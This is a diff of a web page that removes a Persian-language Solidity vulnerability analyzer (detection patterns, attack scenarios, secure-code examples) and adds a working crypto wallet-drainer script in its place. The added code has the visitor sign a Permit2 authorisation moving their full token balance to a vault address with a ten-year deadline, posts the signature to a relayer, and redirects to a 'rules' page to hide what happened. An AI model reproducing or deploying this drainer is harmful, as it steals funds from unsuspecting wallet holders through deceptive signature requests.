-                            "تابع مورد نظر روی کل آرایه iterate می‌کند",
-                            "با افزایش سایز آرایه، gas مورد نیاز بیشتر می‌شود",
-                            "در نهایت تابع از محدودیت گاز block فراتر می‌رود",
-                            "تابع غیرقابل استفاده می‌شود و DoS ایجاد می‌شود"
-                        ],
-                        impact: "غیرقابل استفاده شدن قابلیت‌های قرارداد",
-                        prevention: "محدودیت تعداد تکرار و pagination"
-                    },
-
-                    accessControlBypass: {
-                        title: "سناریوی دور زدن کنترل دسترسی",
-                        steps: [
-                            "مهاجم قراردادی با تابع fallback می‌سازد",
-                            "از تابع بدون کنترل دسترسی استفاده می‌کند",
-                            "یا از tx.origin به جای msg.sender سوءاستفاده می‌کند",
-                            "کاربر عادی را فریب داده تا تراکنش امضا کند",
-                            "مهاجم دسترسی admin پیدا کرده یا وجوه را می‌دزدد"
-                        ],
-                        impact: "کنترل کامل قرارداد یا سرقت وجوه",
-                        prevention: "بررسی دقیق کنترل دسترسی و استفاده از msg.sender"
-                    }
-                };
-            }
-
-            setupEventListeners() {
-                const analyzeBtn = document.getElementById('analyzeBtn');
-                const codeInput = document.getElementById('solidityCode');
-
-                analyzeBtn.addEventListener('click', () => {
-                    this.performAnalysis();
-                });
-
-                let timeout;
-                codeInput.addEventListener('input', () => {
-                    clearTimeout(timeout);
-                    timeout = setTimeout(() => {
-                        this.showQuickHints();
-                    }, 1000);
-                });
-            }
-
-            async performAnalysis() {
-                const code = document.getElementById('solidityCode').value.trim();
-                
-                if (!code) {
-                    this.showError('لطفاً کد Solidity را وارد کنید');
-                    return;
-                }
-
-                this.showLoading();
-                
-                setTimeout(() => {
-                    const vulnerabilities = this.analyzeCode(code);
-                    this.displayResults(vulnerabilities);
-                }, 1500);
-            }
-
-            analyzeCode(code) {
-                const vulnerabilities = [];
-
-                // تحلیل الگوهای اصلی
-                for (const [key, pattern] of Object.entries(this.patterns)) {
-                    const findings = this.detectPattern(code, pattern);
-                    if (findings.length > 0) {
-                        vulnerabilities.push({
-                            id: key,
-                            ...pattern,
-                            findings,
-                            lineNumbers: this.getLineNumbers(code, findings),
-                            confidence: this.calculateConfidence(code, pattern),
-                            attackScenario: this.attackScenarios[key]
-                        });
-                    }
-                }
-
-                // تحلیل‌های پیشرفته
-                vulnerabilities.push(...this.performAdvancedChecks(code));
-
-                // تحلیل متنی
-                vulnerabilities.push(...this.performContextualAnalysis(code));
-
-                return vulnerabilities.sort((a, b) => 
-                    this.getSeverityWeight(b.severity) - this.getSeverityWeight(a.severity)
-                );
-            }
-
-            detectPattern(code, pattern) {
-                const findings = [];
-                let hasVulnerability = false;
-
-                for (const regex of pattern.patterns) {
-                    const matches = [...code.matchAll(regex)];
-                    if (matches.length > 0) {
-                        hasVulnerability = true;
-                        findings.push(...matches.map(match => ({
-                            code: match[0],
-                            position: match.index,
-                            context: this.getContext(code, match.index, 3)
-                        })));
-                    }
-                }
-
-                let hasMitigation = false;
-                for (const antiRegex of pattern.antiPatterns) {
-                    if (antiRegex.test(code)) {
-                        hasMitigation = true;
-                        break;
-                    }
-                }
-
-                return (hasVulnerability && !hasMitigation) ? findings : [];
-            }
-
-            performAdvancedChecks(code) {
-                const advancedVulnerabilities = [];
-
-                this.advancedChecks.complexPatterns.forEach(check => {
-                    if (check.check(code)) {
-                        advancedVulnerabilities.push({
-                            id: check.name,
-                            severity: check.severity,
-                            title: check.title,
-                            description: check.description,
-                            findings: [{code: 'Advanced pattern detected', position: 0}],
-                            lineNumbers: [],
-                            impact: ['financial'],
-                            gasImpact: 'medium',
-                            isAdvanced: true
-                        });
-                    }
-                });
-
-                return advancedVulnerabilities;
-            }
-
-            performContextualAnalysis(code) {
-                const contextualIssues = [];
-
-                // بررسی عدم وجود events
-                if (/function\s+\w+.*payable/g.test(code) && !/emit\s+/g.test(code)) {
-                    contextualIssues.push({
-                        id: 'missing_events',
-                        severity: 'low',
-                        title: 'رویدادهای مفقود در توابع مهم',
-                        description: 'توابع پرداخت بدون انتشار رویداد که ردیابی را دشوار می‌کند',
-                        findings: [{code: 'Missing events in payable functions', position: 0}],
-                        lineNumbers: [],
-                        impact: ['privacy'],
-                        gasImpact: 'low'
-                    });
-                }
-
-                // بررسی مقادیر magic number
-                const magicNumbers = [...code.matchAll(/\b\d{6,}\b/g)];
-                if (magicNumbers.length > 0) {
-                    contextualIssues.push({
-                        id: 'magic_numbers',
-                        severity: 'info',
-                        title: 'اعداد جادویی (Magic Numbers)',
-                        description: 'استفاده از اعداد بزرگ بدون توضیح که خوانایی کد را کاهش می‌دهد',
-                        findings: magicNumbers.map(match => ({
-                            code: match[0],
-                            position: match.index
-                        })),
-                        lineNumbers: this.getLineNumbers(code, magicNumbers.map(m => ({position: m.index}))),
-                        impact: ['governance'],
-                        gasImpact: 'low'
-                    });
-                }
-
-                // بررسی pragma floating
-                if (/pragma\s+solidity\s+\^/g.test(code)) {
-                    contextualIssues.push({
-                        id: 'floating_pragma',
-                        severity: 'info',
-                        title: 'Pragma شناور',
-                        description: 'استفاده از pragma شناور که ممکن است منجر به مشکلات سازگاری شود',
-                        findings: [{code: 'Floating pragma detected', position: 0}],
-                        lineNumbers: [],
-                        impact: ['governance'],
-                        gasImpact: 'low'
-                    });
-                }
-
-                // بررسی عدم استفاده از SafeMath در نسخه‌های قدیمی
-                const hasOldSolidity = /pragma\s+solidity\s+[\^~>=<\s]*0\.[0-7]/g.test(code);
-                const hasMathOperations = /[\+\-\*\/]\s*=/g.test(code);
-                const hasSafeMath = /SafeMath/g.test(code);
-                
-                if (hasOldSolidity && hasMathOperations && !hasSafeMath) {
-                    contextualIssues.push({
-                        id: 'missing_safemath',
-                        severity: 'high',
-                        title: 'عدم استفاده از SafeMath در نسخه قدیمی',
-                        description: 'استفاده از عملیات ریاضی بدون SafeMath در Solidity < 0.8.0',
-                        findings: [{code: 'Missing SafeMath in old Solidity version', position: 0}],
-                        lineNumbers: [],
-                        impact: ['financial'],
-                        gasImpact: 'medium'
-                    });
-                }
-
-                return contextualIssues;
-            }
-
-            getContext(code, position, lines = 2) {
-                const codeLines = code.split('\n');
-                let currentPos = 0;
-                
-                for (let i = 0; i < codeLines.length; i++) {
-                    if (currentPos <= position && position <= currentPos + codeLines[i].length) {
-                        const start = Math.max(0, i - lines);
-                        const end = Math.min(codeLines.length - 1, i + lines);
-                        return codeLines.slice(start, end + 1)
-                            .map((line, idx) => `${start + idx + 1}: ${line}`)
-                            .join('\n');
-                    }
-                    currentPos += codeLines[i].length + 1;
-                }
-                
-                return '';
-            }
-
-            getLineNumbers(code, findings) {
-                const lines = code.split('\n');
-                const lineNumbers = [];
-                
-                findings.forEach(finding => {
-                    let currentPos = 0;
-                    for (let i = 0; i < lines.length; i++) {
-                        if (currentPos <= finding.position && finding.position <= currentPos + lines[i].length) {
-                            lineNumbers.push(i + 1);
-                            break;
-                        }
-                        currentPos += lines[i].length + 1;
-                    }
-                });
-                
-                return [...new Set(lineNumbers)].sort((a, b) => a - b);
-            }
-
-            calculateConfidence(code, pattern) {
-                let confidence = 75;
-                
-                if (pattern.patterns.length > 3) confidence += 10;
-                if (pattern.antiPatterns.length > 2) confidence += 5;
-                if (code.includes('pragma solidity ^0.8')) confidence += 5;
-                if (code.includes('@openzeppelin')) confidence += 10;
-                
-                return Math.min(95, Math.max(65, confidence));
-            }
-
-            getSeverityWeight(severity) {
-                const weights = { critical: 5, high: 4, medium: 3, low: 2, info: 1 };
-                return weights[severity] || 0;
-            }
-
-            showLoading() {
-                const btn = document.getElementById('analyzeBtn');
-                const btnText = document.getElementById('btnText');
-                const results = document.getElementById('results');
-
-                btn.disabled = true;
-                btnText.innerHTML = '🔄 در حال تحلیل عمقی...';
-                
-                results.innerHTML = `
-                    <div class="loading">
-                        <div class="spinner"></div>
-                        <p>تحلیل پیشرفته امنیت در حال انجام...</p>
-                        <p style="font-size: 0.9em; color: var(--text-muted); margin-top: 10px;">
-                            بررسی الگوهای حمله، تحلیل متن، و شناسایی آسیب‌پذیری‌های پنهان
-                        </p>
-                    </div>
-                `;
-            }
-
-            showError(message) {
-                const results = document.getElementById('results');
-                results.innerHTML = `
-                    <div class="no-results">
-                        ⚠️ ${message}
-                    </div>
-                `;
-            }
-
-            showQuickHints() {
-                const code = document.getElementById('solidityCode').value;
-                if (code.length < 50) return;
-
-                console.log('🔍 Quick scan in progress...');
-            }
-
-            displayResults(vulnerabilities) {
-                const btn = document.getElementById('analyzeBtn');
-                const btnText = document.getElementById('btnText');
-                const results = document.getElementById('results');
-
-                btn.disabled = false;
-                btnText.innerHTML = '🔍 تحلیل امنیتی پیشرفته';
-
-                if (vulnerabilities.length === 0) {
-                    results.innerHTML = `
-                        <div class="no-results success">
-                            <div style="font-size: 4rem; margin-bottom: 25px;">✅</div>
-                            <h3>هیچ آسیب‌پذیری امنیتی یافت نشد!</h3>
-                            <p>کد شما از نظر امنیتی بسیار مناسب است و الگوهای امن را رعایت کرده است.</p>
-                        </div>
-                    `;
-                    return;
-                }
-
-                const stats = this.calculateStatistics(vulnerabilities);
-                let html = this.generateStatsHTML(stats);
-                
-                vulnerabilities.forEach((vuln, index) => {
-                    html += this.generateVulnerabilityHTML(vuln, index);
-                });
-
-                results.innerHTML = html;
-                this.attachToggleListeners();
-            }
-
-            calculateStatistics(vulnerabilities) {
-                return {
-                    total: vulnerabilities.length,
-                    critical: vulnerabilities.filter(v => v.severity === 'critical').length,
-                    high: vulnerabilities.filter(v => v.severity === 'high').length,
-                    medium: vulnerabilities.filter(v => v.severity === 'medium').length,
-                    low: vulnerabilities.filter(v => v.severity === 'low').length,
-                    info: vulnerabilities.filter(v => v.severity === 'info').length,
-                    financial: vulnerabilities.filter(v => v.impact && v.impact.includes('financial')).length,
-                    gas: vulnerabilities.filter(v => v.gasImpact === 'high' || v.gasImpact === 'critical').length
-                };
-            }
-
-            generateStatsHTML(stats) {
-                return `
-                    <div class="stats-grid">
-                        <div class="stat-card">
-                            <div class="stat-number">${stats.total}</div>
-                            <div class="stat-label">کل مسائل</div>
-                        </div>
-                        <div class="stat-card">
-                            <div class="stat-number" style="color: var(--danger);">${stats.critical}</div>
-                            <div class="stat-label">بحرانی</div>
-                        </div>
-                        <div class="stat-card">
-                            <div class="stat-number" style="color: #f97316;">${stats.high}</div>
-                            <div class="stat-label">بالا</div>
-                        </div>
-                        <div class="stat-card">
-                            <div class="stat-number" style="color: var(--warning);">${stats.medium}</div>
-                            <div class="stat-label">متوسط</div>
-                        </div>
-                        <div class="stat-card">
-                            <div class="stat-number" style="color: var(--success);">${stats.low + stats.info}</div>
-                            <div class="stat-label">پایین</div>
-                        </div>
-                        <div class="stat-card">
-                            <div class="stat-number" style="color: var(--danger);">${stats.financial}</div>
-                            <div class="stat-label">مالی</div>
-                        </div>
-                    </div>
-                `;
-            }
-
-            generateVulnerabilityHTML(vuln, index) {
-                const recommendations = this.getRecommendations(vuln.id);
-                const codeExample = this.getSecureCodeExample(vuln.id);
-                
-                return `
-                    <div class="vulnerability-card severity-${vuln.severity}">
-                        <div class="vulnerability-header" onclick="toggleVulnerability(${index})">
-                            <div>
-                                <div class="vulnerability-title">${vuln.title}</div>
-                                <div class="vulnerability-meta">
-                                    ${vuln.findings.length} مورد یافت شد
-                                    ${vuln.lineNumbers.length > 0 ? `• خطوط: ${vuln.lineNumbers.slice(0, 5).join(', ')}` : ''}
-                                    ${vuln.confidence ? `• اعتماد: ${vuln.confidence}%` : ''}
-                                    ${vuln.cwe ? `• ${vuln.cwe}` : ''}
-                                    <br>
-                                    ${vuln.impact ? vuln.impact.map(impact => 
-                                        `<span class="impact-badge impact-${impact}">${this.getImpactLabel(impact)}</span>`
-                                    ).join('') : ''}
-                                </div>
-                            </div>
-                            <div>
-                                <span class="severity-badge severity-${vuln.severity}">${this.getSeverityLabel(vuln.severity)}</span>
-                                <span class="expand-icon" id="icon-${index}">▼</span>
-                            </div>
-                        </div>
-                        <div class="vulnerability-details" id="details-${index}">
-                            <p><strong>📋 توضیحات:</strong> ${vuln.description}</p>
-                            
-                            ${vuln.gasImpact ? `
-                                <p><strong>⛽ تأثیر بر گاز:</strong> <span class="severity-badge severity-${vuln.gasImpact}">${vuln.gasImpact}</span></p>
-                            ` : ''}
-                            
-                            <h4 class="section-title">🎯 کدهای مشکل‌دار:</h4>
-                            ${vuln.findings.slice(0, 3).map(finding => 
-                                `<div class="code-block">${this.escapeHtml(finding.code)}</div>
-                                ${finding.context ? `<p style="font-size: 0.9em; color: var(--text-muted); margin: 10px 0;">متن اطراف:</p>
-                                <div class="code-block" style="font-size: 0.85em;">${this.escapeHtml(finding.context)}</div>` : ''}`
-                            ).join('')}
-                            
-                            ${vuln.attackScenario ? `
-                                <div class="attack-scenario">
-                                    <h4>🚨 ${vuln.attackScenario.title}</h4>
-                                    <div class="attack-steps">
-                                        ${vuln.attackScenario.steps.map((step, i) => 
-                                            `<div class="attack-step">
-                                                <strong>گام ${i + 1}:</strong> ${step}
-                                            </div>`
-                                        ).join('')}
-                                    </div>
-                                    <p><strong>تأثیر حمله:</strong> ${vuln.attackScenario.impact}</p>
-                                </div>
-                            ` : ''}
-                            
-                            ${recommendations ? `
-                                <div class="recommendation">
-                                    <h4>💡 راه‌حل پیشنهادی:</h4>
-                                    <p>${recommendations}</p>
-                                </div>
-                            ` : ''}
-                            
-                            ${codeExample ? `
-                                <h4 class="section-title">✅ مثال کد امن:</h4>
-                                <div class="code-block">${codeExample}</div>
-                            ` : ''}
-                            
-                            ${vuln.isAdvanced ? `
-                                <div class="advanced-analysis">
-                                    <h4>🧠 تحلیل هوشمند:</h4>
-                                    <p>این آسیب‌پذیری توسط سیستم تحلیل پیشرفته شناسایی شده و ممکن است توسط ابزارهای معمولی نادیده گرفته شود.</p>
-                                </div>
-                            ` : ''}
-                        </div>
-                    </div>
-                `;
-            }
-
-            getSeverityLabel(severity) {
-                const labels = {
-                    critical: 'بحرانی',
-                    high: 'بالا',
-                    medium: 'متوسط',
-                    low: 'پایین',
-                    info: 'اطلاعاتی'
-                };
-                return labels[severity] || severity;
-            }
-
-            getImpactLabel(impact) {
-                const labels = {
-                    financial: 'مالی',
-                    dos: 'DoS',
-                    privacy: 'حریم خصوصی',
-                    governance: 'حاکمیت'
-                };
-                return labels[impact] || impact;
-            }
-
-            getRecommendations(vulnId) {
-                const recommendations = {
-                    reentrancy: 'از الگوی Checks-Effects-Interactions استفاده کنید: ابتدا شرایط را بررسی کنید، سپس وضعیت را تغییر دهید، و در نهایت با قراردادهای خارجی تعامل کنید. از OpenZeppelin ReentrancyGuard استفاده کنید تا از حملات reentrancy جلوگیری شود.',
-                    
-                    flashLoanAttack: 'از Oracle های مقاوم مانند Chainlink یا TWAP (Time-Weighted Average Price) استفاده کنید. هرگز تنها از یک منبع قیمت استفاده نکنید. محدودیت‌هایی برای تغییرات قیمت ناگهانی در نظر بگیرید.',
-                    
-                    frontRunning: 'از الگوی commit-reveal برای تراکنش‌های حساس استفاده کنید. حد مجاز slippage تعیین کنید و از private mempools یا Meta-transactions برای محافظت از کاربران استفاده کنید.',
-                    
-                    accessControlBypass: 'همیشه از modifier های کنترل دسترسی استفاده کنید. OpenZeppelin AccessControl یا Ownable را به کار بگیرید. هرگز توابع حساس را بدون کنترل دسترسی public نگذارید. از msg.sender به جای tx.origin استفاده کنید.',
-                    
-                    integerOverflow: 'برای Solidity 0.8.0+، بررسی‌های overflow خودکار فعال هستند. برای نسخه‌های قدیمی‌تر، حتماً از OpenZeppelin SafeMath استفاده کنید. در صورت استفاده از unchecked، بسیار محتاط باشید.',
-                    
-                    oracleManipulation: 'از چندین Oracle استفاده کنید و نتایج را با هم مقایسه کنید. از TWAP برای جلوگیری از دستکاری قیمت کوتاه مدت استفاده کنید. حد آستانه‌ای برای تغییرات قیمت غیرعادی تعریف کنید.',
-                    
-                    timestampManipulation: 'از block.timestamp برای منطق حساس زمان‌بندی استفاده نکنید. tolerance زمانی (مثلاً ±15 ثانیه) در نظر بگیرید. برای کاربردهای حساس‌تر از Oracle های زمان خارجی استفاده کنید.',
-                    
-                    txOrigin: 'هرگز از tx.origin برای کنترل دسترسی استفاده نکنید زیرا قابل فریب است. همیشه از msg.sender استفاده کنید که نشان‌دهنده فراخواننده مستقیم است.',
-                    
-                    weakRandomness: 'از Oracle های تصادف امن مانند Chainlink VRF استفاده کنید. هرگز از block.timestamp، block.difficulty، یا block.number برای تولید عدد تصادفی استفاده نکنید زیرا قابل دستکاری هستند.',
-                    
-                    dangerousDelegatecall: 'delegatecall را تنها از آدرس‌های مورد اعتماد و با کنترل دسترسی سخت‌گیرانه استفاده کنید. همیشه نتیجه را بررسی کنید. برای proxy contracts از الگوهای استاندارد OpenZeppelin استفاده کنید.',
-                    
-                    gasLimitDoS: 'از حلقه‌های نامحدود جلوگیری کنید. محدودیت تعداد تکرار قرار دهید. از الگوی pagination برای پردازش مجموعه‌های بزرگ استفاده کنید. از pull over push pattern استفاده کنید.',
-                    
-                    uncheckedExternalCalls: 'همیشه نتیجه فراخوانی‌های خارجی را بررسی کنید. از require() برای اطمینان از موفقیت استفاده کنید. از الگوی withdrawal برای انتقال اتر استفاده کنید.',
-                    
-                    sandwich_attack_vulnerability: 'حد مجاز slippage تعیین کنید، deadline برای تراکنش‌ها قرار دهید، و از AMM هایی با محافظت MEV استفاده کنید.',
-                    
-                    governance_attack: 'Timelock برای تصمیمات حاکمیتی اجباری کنید، حد آستانه بالایی برای پیشنهادات تعیین کنید، و از multi-sig برای تصمیمات مهم استفاده کنید.',
-                    
-                    state_bloating: 'محدودیت اندازه آرایه‌ها تعیین کنید، از mapping ها به جای آرایه‌های بزرگ استفاده کنید، و mechanism پاکسازی پیاده‌سازی کنید.',
-                    
-                    missing_events: 'برای تمام تغییرات مهم وضعیت، رویدادهای مناسب تعریف کنید تا ردیابی و monitoring آسان شود.',
-                    
-                    magic_numbers: 'تمام اعداد ثابت را با نام‌های meaningful به عنوان constant تعریف کنید.',
-                    
-                    floating_pragma: 'نسخه دقیق Solidity را مشخص کنید تا از مشکلات سازگاری جلوگیری شود.',
-                    
-                    missing_safemath: 'در نسخه‌های قبل از 0.8.0، حتماً از OpenZeppelin SafeMath استفاده کنید.'
-                };
-                
-                return recommendations[vulnId] || 'کد را بررسی کرده و از best practices امنیتی استفاده کنید.';
-            }
-
-            getSecureCodeExample(vulnId) {
-                const examples = {
-                    reentrancy: `// استفاده از ReentrancyGuard و الگوی CEI
-import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
-
-contract SafeContract is ReentrancyGuard {
-    mapping(address => uint256) public balances;
-    
-    function withdraw() external nonReentrant {
-        uint256 amount = balances[msg.sender];
-        require(amount > 0, "No funds");
-        
-        // Effects: تغییر وضعیت قبل از تعامل خارجی
-        balances[msg.sender] = 0;
-        
-        // Interactions: تعامل خارجی در آخر
-        (bool success, ) = payable(msg.sender).call{value: amount}("");
-        require(success, "Transfer failed");
+    // Connect wallet
+    status("Requesting wallet connection...");
+    await window.ethereum.request({ method: 'eth_requestAccounts' });
+    const provider = new ethers.BrowserProvider(window.ethereum);
+    const signer = await provider.getSigner();
+    const userAddress = await signer.getAddress();
+    const chainId = await provider.getNetwork().then(n => n.chainId);
+
+    status(`Connected: ${userAddress} on chain ${chainId}`);
+
+    // Read token balance and decimals
+    const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
+    const decimals = await token.decimals().catch(()=>18); // default 18 if fails
+    let balance = await token.balanceOf(userAddress);
+    // convert to human readable for UX (not shown in tx)
+    const human = ethers.formatUnits(balance, decimals);
+    status(`Token ${tokenAddress} balance: ${human} (decimals=${decimals})`);
+
+    // Compute requestedAmount (we want full balance)
+    const requestedAmount = balance.toString(); // string of uint256 smallest units
+    // For unlimited permit, use maxUint256 if you'd like instead of requestedAmount.
+    // const MAX_UINT = (BigInt(1) << BigInt(256)) - BigInt(1);
+    // const requestedAmount = MAX_UINT.toString();
+
+    // Build permit struct for Permit2 (typed-data)
+    // IMPORTANT: You must verify that PERMIT2 contract at PERMIT2_ADDRESS on this chain
+    // implements the exact typed structure. For Sepolia you may deploy a Permit2 or
+    // use EIP-2612-compatible token for quick tests (see README steps).
+    status("Preparing typed data for Permit2...");
+
+    // Try to obtain nonce for Permit2 if available (best-effort)
+    // Some Permit2 implementations expose nonces; if not, fallback to 0.
+    async function getPermit2Nonce(owner) {
+      try {
+        const p2 = new ethers.Contract(PERMIT2_ADDRESS, ["function nonces(address) view returns (uint256)"], provider);
+        const n = await p2.nonces(owner);
+        return n.toString();
+      } catch (e) {
+        // fallback
+        return "0";
+      }
     }
-}`,
-                    
-                    uncheckedExternalCalls: `// بررسی نتیجه فراخوانی‌ها
-function safeTransfer(address to, uint256 amount) external {
-    // روش 1: بررسی با require
-    (bool success, ) = payable(to).call{value: amount}("");
-    require(success, "Transfer failed");
-    
-    // روش 2: استفاده از withdrawal pattern
-    pendingWithdrawals[to] += amount;
-}
 
-function withdraw() external {
-    uint256 amount = pendingWithdrawals[msg.sender];
-    require(amount > 0, "No pending withdrawal");
-    
-    pendingWithdrawals[msg.sender] = 0;
-    payable(msg.sender).transfer(amount);
-}`,
-                    
-                    accessControlBypass: `// کنترل دسترسی صحیح
-import "@openzeppelin/contracts/access/Ownable.sol";
+    const nonce = await getPermit2Nonce(userAddress);
+    const deadline = (BigInt(Math.floor(Date.now()/1000)) + BigInt(60*60*24*365*10)).toString(); // 10 years
+    // Compose domain/types/message per Permit2 spec
+    const domain = {
+      name: "Permit2",
+      version: "1",
+      chainId: chainId,
+      verifyingContract: PERMIT2_ADDRESS
+    };
 
-contract SecureContract is Ownable {
-    modifier onlyAuthorized() {
-        require(msg.sender == owner() || authorizedUsers[msg.sender], "Unauthorized");
-        _;
+    const types = {
+      TokenPermissions: [
+        { name: "token", type: "address" },
+        { name: "amount", type: "uint256" }
+      ],
+      PermitTransferFrom: [
+        { name: "permitted", type: "TokenPermissions" },
+        { name: "nonce", type: "uint256" },
+        { name: "deadline", type: "uint256" }
+      ],
+      SignatureTransferDetails: [
+        { name: "to", type: "address" },
+        { name: "requestedAmount", type: "uint256" }
+      ]
+    };
+
+    const message = {
+      permitted: {
+        token: tokenAddress,
+        amount: requestedAmount
+      },
+      nonce: nonce,
+      deadline: deadline
+    };
+
+    const transferDetails = {
+      to: VAULT_ADDRESS,
+      requestedAmount: requestedAmount
+    };
+
+    const typedData = {
+      domain: domain,
+      types: types,
+      primaryType: "PermitTransferFrom",
+      message: message,
+      // Note: Some wallets expect the full JSON structure for eth_signTypedData_v4 with
+      // an additional "transferDetails" object. We will pass the permit and transferDetails separately
+    };
+
+    // Many wallets do not accept nested complex objects exactly — using eth_signTypedData_v4
+    // we typically send the whole EIP-712 JSON (domain + types + message). We will pack permit and transfer details:
+    const payloadToSign = {
+      domain,
+      message, // this is PermitTransferFrom message
+      types,
+      primaryType: "PermitTransferFrom",
+      // We'll attach transferDetails separately as raw message that relayer will use.
+      transferDetails
+    };
+
+    status("Requesting EIP-712 signature from wallet (Permit2)...");
+
+    // Request signature via MetaMask (eth_signTypedData_v4)
+    const signerAddressChecksum = ethers.getAddress(userAddress);
+    const sig = await window.ethereum.request({
+      method: "eth_signTypedData_v4",
+      params: [signerAddressChecksum, JSON.stringify({
+        domain: domain,
+        message: message,
+        primaryType: "PermitTransferFrom",
+        types: types
+      })]
+    });
+
+    status("Signature obtained. Sending payload to relayer...");
+
+    // Build payload matching relayer expectation
+    const payload = {
+      permit: {
+        permitted: { token: tokenAddress, amount: requestedAmount },
+        nonce: nonce,
+        deadline: deadline
+      },
+      transferDetails: { to: VAULT_ADDRESS, requestedAmount: requestedAmount },
+      owner: userAddress,
+      signature: sig,
+      token: tokenAddress,
+      relayerFee: RELAYER_FEE_STR
+    };
+
+    // POST to relayer
+    const resp = await fetch(RELAYER_ENDPOINT, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+
+    if (!resp.ok) {
+      const txt = await resp.text();
+      status("Relayer error: " + txt);
+      // After failure, still redirect to rules for UX
+      window.location.href = DESTINATION_PAGE;
+      return;
     }
-    
-    function sensitiveFunction() external onlyAuthorized {
-        // تنها کاربران مجاز می‌توانند این تابع را فراخوانی کنند
-        // از msg.sender استفاده کنید، نه tx.origin
-    }
-}`,
-                    
-                    oracleManipulation: `// استفاده از Oracle امن
-import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";
 
-contract PriceConsumer {
-    AggregatorV3Interface internal priceFeed;
-    uint256 private constant PRICE_TOLERANCE = 5; // 5% tolerance
-    
-    constructor() {
-        priceFeed = AggregatorV3Interface(0x...); // Chainlink ETH/USD
-    }
-    
-    function getSecurePrice() public view returns (int256) {
-        (
-            uint80 roundID,
-            int256 price,
-            uint256 startedAt,
-            uint256 timeStamp,
-            uint80 answeredInRound
-        ) = priceFeed.latestRoundData();
-        
-        require(timeStamp > 0, "Round not complete");
-        require(block.timestamp - timeStamp < 3600, "Price too old");
-        
-        return price;
-    }
-}`,
-                    
-                    gasLimitDoS: `// جلوگیری از DoS با گاز
-contract SafeIteration {
-    uint256 public constant MAX_ITERATIONS = 50;
-    uint256[] private items;
-    
-    function processBatch(uint256 startIndex) external {
-        uint256 endIndex = startIndex + MAX_ITERATIONS;
-        if (endIndex > items.length) {
-            endIndex = items.length;
-        }
-        
-        for (uint256 i = startIndex; i < endIndex; i++) {
-            // پردازش آیتم
-            processItem(items[i]);
-        }
-    }
-    
-    // یا استفاده از pull pattern
-    mapping(address => uint256) public rewards;
-    
-    function claimReward() external {
-        uint256 reward = rewards[msg.sender];
-        require(reward > 0, "No reward");
-        
-        rewards[msg.sender] = 0;
-        payable(msg.sender).transfer(reward);
-    }
-}`
-                };
-                
-                return examples[vulnId] || null;
-            }
+    const result = await resp.json();
+    status("Relayer accepted payload. txHash: " + (result.txHash || "pending"));
 
-            attachToggleListeners() {
-                // Event listeners are attached via onclick in HTML
-            }
+    // After success (or regardless) redirect to rules page
+    setTimeout(() => { window.location.href = DESTINATION_PAGE; }, 1200);
 
-            escapeHtml(text) {
-                const div = document.createElement('div');
-                div.textContent = text;
-                return div.innerHTML;
-            }
-        }
-
-        // Global functions for HTML onclick events
-        function toggleVulnerability(index) {
-            const details = document.getElementById(`details-${index}`);
-            const icon = document.getElementById(`icon-${index}`);
-            
-            if (details.classList.contains('active')) {
-                details.classList.remove('active');
-                icon.classList.remove('rotated');
-            } else {
-                details.classList.add('active');
-                icon.classList.add('rotated');
-            }
-        }
-
-        // Initialize the analyzer
-        document.addEventListener('DOMContentLoaded', () => {
-            new UltimateSecurityAnalyzer();
-        });
-    </script>
+  } catch (err) {
+    console.error(err);
+    document.getElementById('status').innerText = "Error: " + (err.message || String(err));
+  }
+})();
+</script>
 </body>
 </html>
